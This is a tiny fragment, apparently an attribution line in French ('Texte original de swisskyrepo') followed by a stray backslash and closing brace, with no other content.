Texte original de swisskyrepo\
}